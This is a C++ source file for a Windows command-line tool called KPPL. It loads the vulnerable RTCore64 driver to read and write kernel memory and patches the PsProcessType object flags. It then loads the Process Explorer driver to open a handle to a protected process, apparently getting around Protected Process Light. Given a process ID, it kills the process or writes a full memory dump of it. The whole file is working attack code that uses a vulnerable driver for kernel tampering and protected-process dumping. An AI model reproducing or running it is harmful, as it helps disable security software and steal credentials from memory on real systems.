// KPPL.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "pch.h"
#include <iostream>
#include "SysManager.h"
#include "ObjectManager.h"
#include "SysManager.h"
#include "DriverHelper.h"
#include "SecurityHelper.h"
#include "AccessMaskDecoder.h"
#include "KernelHelper.h"



void ProcessOption(const char cmd, HANDLE hProcess,DWORD pid);

void ProcessOption(const char cmd,HANDLE hProcess,DWORD pid) {
    switch (cmd)
    {
        case 'k':
        {
            bool success = ::TerminateProcess(hProcess, 0);
            if (!success)
                printf("TernimateProcess failed: %d\n", GetLastError());
            break;
        }
        case 'd':
        {
            wil::unique_hfile hFile(::CreateFile(L"xxx.dump", GENERIC_ALL, 0, nullptr, CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL, nullptr));
            if (hFile.get() != INVALID_HANDLE_VALUE) {
                bool isDumped = ::MiniDumpWriteDump(hProcess, pid, hFile.get(), MiniDumpWithFullMemory, nullptr, nullptr, nullptr);
                if (!isDumped) {
                    printf("Dump failed: 0x%x\n", GetLastError());
                }
            }
            break;
        }
        default:
            break;
    }
}

int main(int argc,const char *argv[]){
    if (argc < 2) {
        printf("Usage: KPPL.exe pid option\n \
            k -- kill the process \n \
            d -- dump the process\n \
            ex. KPPL.exe 1234 k");
        return 0;
    }
    SecurityHelper::EnablePrivilege(L"SeDebugPrivilege", true);

    ObjectManager objMgr;
    bool success = false;
    std::wstring sysPath, serviceName, displayName;
    WCHAR path[MAX_PATH];
    ::GetCurrentDirectory(MAX_PATH, path);
#ifdef _WIN64
    sysPath = std::wstring(path) + L"\\RTCore64.sys";
    serviceName = L"RTCore64";
    displayName = L"RT Core64";
#else
    sysPath = std::wstring(path) + L"\\RTCore32.sys";
    serviceName = L"RTCore32";
    displayName = L"RT Core32";
#endif // _WIN64

   
    SysManager rtCoreMgr(sysPath, serviceName, displayName, false);
    
    success = rtCoreMgr.Install();
    if (!success) {
        printf("rtCore install failed\n");
        return -1;
    }
    printf("Install success!\n");
    success = rtCoreMgr.Run();
    if (success) {
        // 操作系统相关
        KernelHelper kernel;
        printf("KernelBase: %p\n", KernelHelper::_kernelBase);
        DWORD Offset = KernelHelper::GetSymbolOffset("PsProcessType");
        ULONG_PTR pPsProcessType = KernelHelper::_kernelBase + Offset;
        printf("Offset : %p\r\n", Offset);
        printf("pPsProcessType: %p\r\n", pPsProcessType);
        getchar();
#ifdef _WIN64
        ULONG_PTR PsProcessType = kernel.ReadMemoryDWORD64(pPsProcessType);
#else _WIN32
        ULONG_PTR PsProcessType = kernel.ReadMemoryDWORD(pPsProcessType);
#endif // _WIN64

#ifdef _WIN64
        ULONG_PTR PsProcessTypeInfo = PsProcessType + 0x40;
#else
        ULONG_PTR PsProcessTypeInfo = PsProcessType + 0x28;
#endif
        ULONG_PTR PsProcessTypeFlags = PsProcessTypeInfo + 0x2;

        printf("PsProcessType: %p\n", PsProcessType);
        printf("PsProcessTypeInfo: %p\r\n", PsProcessTypeInfo);
        printf("PsProcessTypeFlags: %p\r\n", PsProcessTypeFlags);
        getchar();

        WORD ObjectTypeFlags = kernel.ReadMemoryWORD(PsProcessTypeFlags);
        printf("ObjectTypeFlags: 0x%x\n", ObjectTypeFlags);
        WORD NewObjectTypeFlags = ObjectTypeFlags;
        NewObjectTypeFlags &= (~(1 << 6));
        printf("NewObjectTypeFlags: 0x%x\n", NewObjectTypeFlags);
        kernel.WriteMemoryWORD(PsProcessTypeFlags, NewObjectTypeFlags);
        NewObjectTypeFlags = kernel.ReadMemoryWORD(PsProcessTypeFlags);
        printf("New ObjectTypeFlags: 0x%x\n", NewObjectTypeFlags);

        sysPath = std::wstring(path) + L"\\PROCEXP152.SYS";
        serviceName = L"PROCEXP152";
        displayName = L"Process Explorer";
        std::wcout << sysPath << std::endl;
        SysManager sysMgr(sysPath, serviceName, displayName, false);

        printf("Install service...\n");

        do
        {
            success = sysMgr.Install();
            if (!success) {
                kernel.WriteMemoryWORD(PsProcessTypeFlags, ObjectTypeFlags);
                break;
            }
            printf("Run service...\n");
            success = sysMgr.Run();
            if (!success) {
                kernel.WriteMemoryWORD(PsProcessTypeFlags, ObjectTypeFlags);
                break;
            }
            DWORD pid = atoi(argv[1]);
            HANDLE hProcess = DriverHelper::OpenProcess(pid);
            kernel.WriteMemoryWORD(PsProcessTypeFlags, ObjectTypeFlags);
            if (hProcess != nullptr)
                printf("Handle: %d (0x%X)\n", hProcess, hProcess);

            objMgr.EnumHandles(GetCurrentProcessId());
            for (auto& hi : objMgr.GetHandles()) {
                if (hi->HandleValue == HandleToULong(hProcess)) {
                    printf("Access: %d (0x%X)\n", hi->GrantedAccess, hi->GrantedAccess);
                    std::wstring result = AccessMaskDecoder::DecodeAccessMask(L"Process", hi->GrantedAccess);
                    std::wcout << result << std::endl;
                }
            }
            if (hProcess != nullptr) {
                char cmd = *argv[2];
                ProcessOption(cmd, hProcess,pid);
                ::CloseHandle(hProcess);
            }
        } while (false);
    }
    else {
        printf("Removed\n");
    }
}


